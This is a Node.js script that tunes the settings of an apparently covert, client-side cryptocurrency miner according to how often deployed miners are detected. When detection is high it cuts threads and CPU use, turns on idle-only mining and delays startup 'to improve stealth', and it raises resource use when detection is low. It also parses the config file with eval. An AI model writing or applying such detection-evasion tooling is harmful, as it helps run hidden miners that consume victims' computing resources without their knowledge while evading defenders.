/**
 * Mining Parameter Optimization Script
 * 
 * This script analyzes mining performance data and adjusts parameters
 * to optimize mining efficiency while minimizing detection risk.
 * 
 * Usage: node optimize-mining.js [--apply]
 * Without --apply flag, it will only suggest changes without applying them.
 */

const fs = require('fs');
const path = require('path');
const { execSync } = require('child_process');

// Configuration
const config = {
  minerConfigPath: './client/src/lib/minerConfig.ts',
  performanceDataPath: './mining-performance-data.json',
  detectionThreshold: 0.05, // 5% detection rate is considered high
  applyChanges: process.argv.includes('--apply'),
  verbose: true
};

// Logging utility
const log = (message, type = 'info') => {
  const colors = {
    info: '\x1b[36m%s\x1b[0m',    // Cyan
    success: '\x1b[32m%s\x1b[0m',  // Green
    warning: '\x1b[33m%s\x1b[0m',  // Yellow
    error: '\x1b[31m%s\x1b[0m',    // Red
  };
  
  console.log(colors[type], `[${type.toUpperCase()}] ${message}`);
};

// Read the current miner configuration
function readMinerConfig() {
  try {
    const configFile = fs.readFileSync(config.minerConfigPath, 'utf8');
    
    // Extract the configuration object using regex
    // This is a simple approach - in a real implementation, you might want to use a TypeScript parser
    const configMatch = configFile.match(/export const minerConfig = ({[\s\S]*?});/);
    
    if (!configMatch) {
      throw new Error('Could not find minerConfig in the file');
    }
    
    // Dangerous but simple way to parse the config
    // In a real implementation, use a proper parser
    const configObj = eval(`(${configMatch[1]})`);
    
    return {
      content: configFile,
      config: configObj
    };
  } catch (error) {
    log(`Error reading miner config: ${error.message}`, 'error');
    process.exit(1);
  }
}

// Read performance data
function readPerformanceData() {
  try {
    if (!fs.existsSync(config.performanceDataPath)) {
      // Create sample data if file doesn't exist
      const sampleData = {
        miners: [
          {
            id: 'sample_miner_1',
            detectionRate: 0.02,
            hashrate: 320,
            cpuUsage: 55,
            threads: 2,
            uptime: 172800 // 2 days in seconds
          },
          {
            id: 'sample_miner_2',
            detectionRate: 0.07,
            hashrate: 480,
            cpuUsage: 75,
            threads: 4,
            uptime: 86400 // 1 day in seconds
          },
          {
            id: 'sample_miner_3',
            detectionRate: 0.01,
            hashrate: 240,
            cpuUsage: 40,
            threads: 2,
            uptime: 259200 // 3 days in seconds
          }
        ],
        aggregateStats: {
          averageDetectionRate: 0.033,
          averageHashrate: 346.67,
          averageCpuUsage: 56.67,
          averageUptime: 172800,
          totalMiners: 3
        },
        timestamp: new Date().toISOString()
      };
      
      fs.writeFileSync(config.performanceDataPath, JSON.stringify(sampleData, null, 2));
      log('Created sample performance data file', 'info');
      return sampleData;
    }
    
    const data = JSON.parse(fs.readFileSync(config.performanceDataPath, 'utf8'));
    return data;
  } catch (error) {
    log(`Error reading performance data: ${error.message}`, 'error');
    process.exit(1);
  }
}

// Analyze data and suggest optimizations
function analyzeAndOptimize(minerConfig, performanceData) {
  log('Analyzing mining performance data...', 'info');
  
  const { aggregateStats } = performanceData;
  const optimizations = [];
  
  // Check detection rate
  if (aggregateStats.averageDetectionRate > config.detectionThreshold) {
    log(`High detection rate detected: ${(aggregateStats.averageDetectionRate * 100).toFixed(2)}%`, 'warning');
    
    // Suggest reducing threads if currently more than 1
    if (minerConfig.performance.threads > 1) {
      optimizations.push({
        parameter: 'threads',
        currentValue: minerConfig.performance.threads,
        suggestedValue: minerConfig.performance.threads - 1,
        reason: 'High detection rate - reducing thread count to improve stealth'
      });
    }
    
    // Suggest reducing CPU limit
    if (minerConfig.performance.cpuLimit > 30) {
      const newLimit = Math.max(30, minerConfig.performance.cpuLimit - 15);
      optimizations.push({
        parameter: 'cpuLimit',
        currentValue: minerConfig.performance.cpuLimit,
        suggestedValue: newLimit,
        reason: 'High detection rate - reducing CPU usage to improve stealth'
      });
    }
    
    // Suggest enabling idleOnly if not already enabled
    if (!minerConfig.performance.idleOnly) {
      optimizations.push({
        parameter: 'idleOnly',
        currentValue: false,
        suggestedValue: true,
        reason: 'High detection rate - enabling idle-only mining to improve stealth'
      });
    }
  } else {
    log(`Detection rate is acceptable: ${(aggregateStats.averageDetectionRate * 100).toFixed(2)}%`, 'success');
    
    // If detection rate is low, we can potentially optimize for performance
    if (aggregateStats.averageDetectionRate < 0.02) {
      // Suggest increasing threads if CPU usage is low
      if (aggregateStats.averageCpuUsage < 50 && minerConfig.performance.threads < 4) {
        optimizations.push({
          parameter: 'threads',
          currentValue: minerConfig.performance.threads,
          suggestedValue: minerConfig.performance.threads + 1,
          reason: 'Low detection rate - can increase thread count for better performance'
        });
      }
      
      // Suggest increasing CPU limit if currently low
      if (minerConfig.performance.cpuLimit < 70) {
        const newLimit = Math.min(70, minerConfig.performance.cpuLimit + 10);
        optimizations.push({
          parameter: 'cpuLimit',
          currentValue: minerConfig.performance.cpuLimit,
          suggestedValue: newLimit,
          reason: 'Low detection rate - can increase CPU usage for better performance'
        });
      }
    }
  }
  
  // Check if startup delay can be optimized
  if (minerConfig.performance.startupDelay > 600 && aggregateStats.averageDetectionRate < 0.03) {
    optimizations.push({
      parameter: 'startupDelay',
      currentValue: minerConfig.performance.startupDelay,
      suggestedValue: Math.max(300, minerConfig.performance.startupDelay - 120),
      reason: 'Low detection rate - can reduce startup delay for faster mining initiation'
    });
  } else if (aggregateStats.averageDetectionRate > 0.04 && minerConfig.performance.startupDelay < 600) {
    optimizations.push({
      parameter: 'startupDelay',
      currentValue: minerConfig.performance.startupDelay,
      suggestedValue: minerConfig.performance.startupDelay + 120,
      reason: 'Elevated detection rate - increasing startup delay for better stealth'
    });
  }
  
  return optimizations;
}

// Apply optimizations to the config file
function applyOptimizations(minerConfigData, optimizations) {
  if (!config.applyChanges) {
    log('Dry run mode - changes will not be applied', 'warning');
    return minerConfigData.content;
  }
  
  log('Applying optimizations to miner configuration...', 'info');
  
  let updatedContent = minerConfigData.content;
  
  optimizations.forEach(opt => {
    const paramPath = opt.parameter.includes('.') 
      ? opt.parameter 
      : `performance.${opt.parameter}`;
    
    // Create regex patterns for different types of values
    const boolPattern = new RegExp(`(${paramPath}):\\s*(true|false)`, 'g');
    const numberPattern = new RegExp(`(${paramPath}):\\s*(\\d+)`, 'g');
    
    if (typeof opt.suggestedValue === 'boolean') {
      updatedContent = updatedContent.replace(
        boolPattern, 
        `$1: ${opt.suggestedValue}`
      );
    } else if (typeof opt.suggestedValue === 'number') {
      updatedContent = updatedContent.replace(
        numberPattern, 
        `$1: ${opt.suggestedValue}`
      );
    }
  });
  
  return updatedContent;
}

// Save updated config
function saveUpdatedConfig(updatedContent) {
  if (!config.applyChanges) {
    return false;
  }
  
  try {
    // Create backup
    const backupPath = `${config.minerConfigPath}.backup`;
    fs.copyFileSync(config.minerConfigPath, backupPath);
    log(`Backup created at ${backupPath}`, 'info');
    
    // Write updated config
    fs.writeFileSync(config.minerConfigPath, updatedContent);
    log('Configuration updated successfully', 'success');
    return true;
  } catch (error) {
    log(`Error saving updated config: ${error.message}`, 'error');
    return false;
  }
}

// Main function
function main() {
  log('Mining Parameter Optimization Script', 'info');
  log(`Mode: ${config.applyChanges ? 'Apply Changes' : 'Suggest Only'}`, 'info');
  
  // Read current configuration
  const minerConfigData = readMinerConfig();
  
  // Read performance data
  const performanceData = readPerformanceData();
  
  // Analyze and suggest optimizations
  const optimizations = analyzeAndOptimize(minerConfigData.config, performanceData);
  
  // Display suggested optimizations
  if (optimizations.length === 0) {
    log('No optimizations suggested - current configuration is optimal', 'success');
    return;
  }
  
  log(`\n${optimizations.length} optimization(s) suggested:`, 'info');
  optimizations.forEach((opt, index) => {
    log(`\n[${index + 1}] ${opt.parameter}:`, 'info');
    log(`  Current: ${opt.currentValue}`, 'info');
    log(`  Suggested: ${opt.suggestedValue}`, 'info');
    log(`  Reason: ${opt.reason}`, 'info');
  });
  
  // Apply optimizations if requested
  if (config.applyChanges) {
    const updatedContent = applyOptimizations(minerConfigData, optimizations);
    const saved = saveUpdatedConfig(updatedContent);
    
    if (saved) {
      log('\nOptimizations applied successfully!', 'success');
      log('Restart your application for changes to take effect.', 'info');
    }
  } else {
    log('\nTo apply these optimizations, run with --apply flag:', 'info');
    log('node optimize-mining.js --apply', 'info');
  }
}

// Run the script
main();